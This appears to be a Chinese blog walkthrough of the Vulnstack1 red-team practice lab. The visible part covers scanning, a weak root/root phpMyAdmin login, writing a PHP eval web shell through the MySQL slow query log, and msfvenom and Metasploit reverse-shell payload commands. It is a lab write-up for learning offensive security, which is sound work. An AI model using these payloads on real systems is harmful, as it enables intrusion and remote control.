@@ -1,0 +1,1759 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="红日靶场1">
+<title>Vulnstack1</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/shentou/vulnstack/vulnstack1/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="Vulnstack1">
+<meta property='og:description' content="红日靶场1">
+<meta property='og:url' content='https://gsygsr.github.io/shentou/vulnstack/vulnstack1/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Shentou' /><meta property='article:published_time' content='2025-03-03T14:57:12&#43;08:00'/><meta property='article:modified_time' content='2025-03-03T15:27:11&#43;08:00'/><meta property='og:image' content='https://gsygsr.github.io/shentou/vulnstack/vulnstack1/14.jpg' />
+<meta name="twitter:title" content="Vulnstack1">
+<meta name="twitter:description" content="红日靶场1"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/shentou/vulnstack/vulnstack1/14.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#font-stylecolorrgb33-37-41靶场描述font"><font style="color:rgb(33, 37, 41);">靶场描述</font></a></li>
+    <li><a href="#靶场搭建">靶场搭建</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#探测主机">探测主机</a></li>
+        <li><a href="#扫描端口">扫描端口</a></li>
+      </ol>
+    </li>
+    <li><a href="#外网渗透">外网渗透</a>
+      <ol>
+        <li><a href="#弱口令">弱口令</a></li>
+        <li><a href="#数据库写shell">数据库写shell</a></li>
+      </ol>
+    </li>
+    <li><a href="#后渗透">后渗透</a>
+      <ol>
+        <li><a href="#msf">msf</a>
+          <ol>
+            <li><a href="#1提权">1.提权</a></li>
+            <li><a href="#2获取账号密码">2.获取账号密码</a></li>
+          </ol>
+        </li>
+        <li><a href="#cs上线">cs上线</a>
+          <ol>
+            <li><a href="#cs生成木马">cs生成木马</a></li>
+          </ol>
+        </li>
+        <li><a href="#font-stylecolorrgb79-79-79msf-联动-cobaltstrikefont"><font style="color:rgb(79, 79, 79);">msf 联动 cobaltstrike</font></a>
+          <ol>
+            <li><a href="#1cs提权">1.cs提权</a></li>
+            <li><a href="#2cs获取账号密码">2.cs获取账号密码</a></li>
+          </ol>
+        </li>
+        <li><a href="#留后门">留后门</a></li>
+        <li><a href="#远程连接">远程连接</a></li>
+      </ol>
+    </li>
+    <li><a href="#内网渗透">内网渗透</a>
+      <ol>
+        <li><a href="#横向移动">横向移动</a>
+          <ol>
+            <li><a href="#搭建隧道">搭建隧道</a></li>
+          </ol>
+        </li>
+        <li><a href="#内网信息收集">内网信息收集</a></li>
+        <li><a href="#横向探测">横向探测</a>
+          <ol>
+            <li><a href="#扫主机">扫主机</a></li>
+            <li><a href="#扫端口">扫端口</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/shentou/vulnstack/vulnstack1/">
+                <img src="/shentou/vulnstack/vulnstack1/14_hue438cfe9143abe931df507258b8df3ff_261430_800x0_resize_q75_box.jpg"
+                        srcset="/shentou/vulnstack/vulnstack1/14_hue438cfe9143abe931df507258b8df3ff_261430_800x0_resize_q75_box.jpg 800w, /shentou/vulnstack/vulnstack1/14_hue438cfe9143abe931df507258b8df3ff_261430_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnstack1" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #2a9d8f; color: #fff;">
+                渗透
+            </a>
+        
+            <a href="/categories/vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" style="background-color: #2a9d8f; color: #fff;">
+                Vulnstack(红日)靶场
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/shentou/vulnstack/vulnstack1/">Vulnstack1</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            红日靶场1
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 03, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="font-stylecolorrgb33-37-41靶场描述font"><font style="color:rgb(33, 37, 41);">靶场描述</font>
+</h2><p><font style="color:rgb(33, 37, 41);">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019</font></p>
+<p><font style="color:rgb(33, 37, 41);">网络拓扑图</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d.png"
+	width="1072"
+	height="535"
+	srcset="/shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d_hu92dfa5943a313d668f9139c88391b813_240469_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d_hu92dfa5943a313d668f9139c88391b813_240469_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<h2 id="靶场搭建">靶场搭建
+</h2><p><img src="/shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa.png"
+	width="337"
+	height="149"
+	srcset="/shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa_hu9b023e32bc162235a6659e0c3146914a_7174_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa_hu9b023e32bc162235a6659e0c3146914a_7174_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="542px"
+	
+></p>
+<p>VM1为win7,VM2为win2003,VM3为win2008</p>
+<p>VM1作为内外网的枢纽,要内外网联通</p>
+<p>三台靶机要在一个内网里,	网络适配器都要选仅主机,VM1要多弄个网卡选择NAT模式</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4.png"
+	width="373"
+	height="370"
+	srcset="/shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4_huf5991980b549d012ee7bcd26af8b75e6_21857_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4_huf5991980b549d012ee7bcd26af8b75e6_21857_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="241px"
+	
+></p>
+<p>查看网络是否联通</p>
+<p>ip:</p>
+<p>win7 外:192.168.184.143 内:192.168.52.143</p>
+<p>win2003 :192.168.52.141</p>
+<p>win2008 :192.168.52.138</p>
+<p>VM1可以ping通外网和内网<img src="/shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c.png"
+	width="669"
+	height="415"
+	srcset="/shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c_hu05919fa0745793d47e27d083f6e5516c_26562_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c_hu05919fa0745793d47e27d083f6e5516c_26562_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="386px"
+	
+></p>
+<p>而用kali不能ping通内网,能ping通VM1的外网</p>
+<p>说明靶场环境搭建好了</p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="探测主机">探测主机
+</h3><p><img src="/shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5.png"
+	width="377"
+	height="152"
+	srcset="/shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5_hua2a37fc3da91ff291ebb623364bfb148_64404_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5_hua2a37fc3da91ff291ebb623364bfb148_64404_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>能探测到VM1的外网</p>
+<h3 id="扫描端口">扫描端口
+</h3><p><img src="/shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd.png"
+	width="1033"
+	height="270"
+	srcset="/shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd_hu6cb4640dfe57431320dd1a94612a48ea_220978_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd_hu6cb4640dfe57431320dd1a94612a48ea_220978_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="918px"
+	
+></p>
+<p>访问80端口</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e.png"
+	width="1114"
+	height="583"
+	srcset="/shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e_hu25c43e3b67f2eca87ece53fcb5cf30c4_117505_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e_hu25c43e3b67f2eca87ece53fcb5cf30c4_117505_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="458px"
+	
+></p>
+<p>扫目录</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2.png"
+	width="779"
+	height="607"
+	srcset="/shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2_hu3eb5452443a1ce0f269116e7e6fe2be6_368486_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2_hu3eb5452443a1ce0f269116e7e6fe2be6_368486_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="128"
+		data-flex-basis="308px"
+	
+></p>
+<h2 id="外网渗透">外网渗透
+</h2><h3 id="弱口令">弱口令
+</h3><p><code>root/root</code>登录到phpadmin后台</p>
+<h3 id="数据库写shell">数据库写shell
+</h3><p>可以通过<code>into outfile</code>或者日志写入shell</p>
+<p>前提是<code>secure_file_priv</code>的值是空</p>
+<p><code>SHOWGLOBALVARIABLESLIKE'%secure%'</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1.png"
+	width="892"
+	height="378"
+	srcset="/shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1_hufd180e47007c70dc23908645120d96b2_19538_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1_hufd180e47007c70dc23908645120d96b2_19538_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="566px"
+	
+></p>
+<p>不允许通过into outfile来写shell</p>
+<p>慢查询日志绕过secure_file_priv写shell'</p>
+<p><font style="color:rgb(77, 77, 77);">查看慢查询日志开启情况</font></p>
+<p><code>show variables like '%slow_query_log%';</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22.png"
+	width="638"
+	height="315"
+	srcset="/shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22_hu54b3c49d89bc5412315a520ef877ab7d_18413_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22_hu54b3c49d89bc5412315a520ef877ab7d_18413_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">开启慢查询日志</font></p>
+<p><code>set global slow_query_log=1;</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed.png"
+	width="450"
+	height="294"
+	srcset="/shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed_hu1a237115e9c8adc60291c8c02b4053e6_17251_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed_hu1a237115e9c8adc60291c8c02b4053e6_17251_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="367px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">修改日志文件存储的绝对路径</font></p>
+<p><code>set global slow_query_log_file='C:/phpStudy/WWW/4449.php';</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25.png"
+	width="722"
+	height="301"
+	srcset="/shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25_hu71d7dddc2b6dc139bc6f5db8aa38a492_23396_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25_hu71d7dddc2b6dc139bc6f5db8aa38a492_23396_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">向日志文件中写入shellselect</font></p>
+<p><code>select '&lt;?php @eval($_POST[cmd]);?&gt;' or sleep(11);</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7.png"
+	width="685"
+	height="247"
+	srcset="/shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7_hucc02cf2cae800fda40af55e90cb6add5_21578_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7_hucc02cf2cae800fda40af55e90cb6add5_21578_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="665px"
+	
+></p>
+<p><font style="color:rgb(77, 77, 77);">使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：</font></p>
+<p><code>show global variables like '%long_query_time%';</code></p>
+<p>执行成功</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9.png"
+	width="1277"
+	height="828"
+	srcset="/shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9_hu429e88163a80ee6fce6daa1f54f9eb02_115513_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9_hu429e88163a80ee6fce6daa1f54f9eb02_115513_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="370px"
+	
+></p>
+<p>直接写个bash反弹getshell</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b.png"
+	width="842"
+	height="169"
+	srcset="/shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b_hu134681fd6f97dd9992b0baa9defd2f94_9109_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b_hu134681fd6f97dd9992b0baa9defd2f94_9109_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="498"
+		data-flex-basis="1195px"
+	
+></p>
+<p>好像弹不成功</p>
+<p>那就用蚁剑连了</p>
+<h2 id="后渗透">后渗透
+</h2><h3 id="msf">msf
+</h3><p>msf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl">set payload windows/x64/meterpreter_reverse_tcp
+</span></span><span class="line"><span class="cl">set lhost 192.168.184.128
+</span></span><span class="line"><span class="cl">set lport 1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.184.128 lport=1234 -f exe -o run.exe</code></p>
+<p>将exe通过蚁剑丢到网站上</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e.png"
+	width="503"
+	height="334"
+	srcset="/shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e_hu3505ef5a1a93340622f77d217b0e219c_25085_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e_hu3505ef5a1a93340622f77d217b0e219c_25085_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="361px"
+	
+></p>
